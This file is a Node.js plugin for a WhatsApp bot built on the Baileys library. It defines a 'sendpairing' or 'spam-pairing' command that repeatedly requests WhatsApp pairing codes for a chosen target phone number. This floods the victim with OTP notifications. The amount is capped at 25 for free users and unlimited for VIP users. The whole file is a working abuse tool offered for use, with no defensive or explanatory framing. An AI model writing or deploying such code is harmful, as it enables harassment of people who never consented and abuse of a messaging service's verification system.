const {
    makeWASocket,
    delay,
    useMultiFileAuthState,
    Browsers,
    makeCacheableSignalKeyStore
  } = require("baileys");
  const fs = require("fs");
  const path = require("path");
  const pino = require("pino");
  
  module.exports = {
    name: ["sendpairing", "spam-pairing"],
    category: ["other"],
    description: "Send pairing to target number",
    async execute(m, { client, args, isVip }) {
      const target = args[0];
      const amount = parseInt(args[1], 10);
  
      const numberPattern = /^628[0-9]{9,}$/; 
      if (!numberPattern.test(target)) {
        return m.reply("Invalid target number format. Please enter a valid number that starts with '62' and is followed by at least 8 digits.");
      }
  
      if (isNaN(amount) || amount <= 0) {
        return m.reply("Please provide a valid amount greater than 0.");
      }
  
      const maxAmountForFreeUser = 25;
      let maxAmount = isVip ? Infinity : maxAmountForFreeUser;
  
      if (amount > maxAmount) {
        return m.reply(`You can only send a maximum of ${maxAmount} pairing codes.`);
      }
  
      m.reply(`Sending ${amount} OTP codes to the target...`);
  
      const authFilePath = path.join(__dirname, "../src/pairings");
      const authFile = path.join(authFilePath, "creds.json");
  
      if (fs.existsSync(authFile)) {
        fs.unlinkSync(authFile);
      }
  
      let { state, saveCreds } = await useMultiFileAuthState(authFilePath);
      const silentLog = pino({ level: "silent" });
  
      const otp = makeWASocket({
        logger: silentLog,
        printQRInTerminal: false,
        browser: Browsers.windows("Edge"),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" }))
        },
        defaultQueryTimeoutMs: undefined
      });
  
      await delay(3000); 
  
      for (let i = 0; i < amount; i++) {
        await delay(3000); 
        try {
          const PairingCode = await otp.requestPairingCode(target);
          const otpCode = PairingCode?.match(/.{1,4}/g)?.join("-") || PairingCode;
  
          console.log(`OTP Code #${i + 1}:`, otpCode);
        } catch (error) {
          console.error(`Error sending OTP #${i + 1}:`, error);
  
          if (error.output && error.output.statusCode === 428 && error.output.payload.message === 'Connection Closed') {
            break; 
          }
  
        }
      }
  
      m.reply(`Finished sending OTP codes. Attempted ${amount} sends.`);
    },
  };
  